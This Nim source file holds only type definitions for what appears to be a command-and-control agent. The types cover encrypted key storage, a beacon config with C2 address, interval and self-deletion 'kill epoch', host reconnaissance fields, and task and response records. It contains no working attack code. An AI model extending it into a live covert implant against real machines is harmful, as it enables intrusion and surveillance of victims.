from enkodo/serialize import EncObj, Key, Nonce, Mac
export Key, Nonce, Mac, EncObj

#this is used to store the encrypted bytes
type
  EncConfig* = ref object
    privKey*: Key
    pubKey*: Key
    encObj*: EncObj

type
  StaticConfig* = ref object
    buildID*: string      #generated on build
    deploymentID*: string #generated on deployment
    c2PubKey*: Key        #to ensure the C2 is the one we want to talk to 
    killEpoch*: int32  #what point should the agent stop calling back and delete
    interval*: int32   #how often should the agent call back
    callback*: string  #where the C2 is 

type 
  Status* = ref object
    ip*: string
    externalIP*: string
    hostname*: string
    os*: string
    arch*: string
    users*: string
    bootTime*: int

type
  Callback* = ref object
    config*: StaticConfig
    status*: Status

# Define a type for tasks
type 
  Task* = object
    taskId*: string # Unique identifier for the task
    taskNum*: int # Task number
    retrieved*: bool # Whether the task has been retrieved
    complete*: bool # Whether the task has been completed
    arg*: string # Request data for the task
    resp*: string # Response data for the task

# Define a type for responses
type
  Resp* = object
    taskId*: string # Unique identifier for the task
    resp*: string # Response data for the task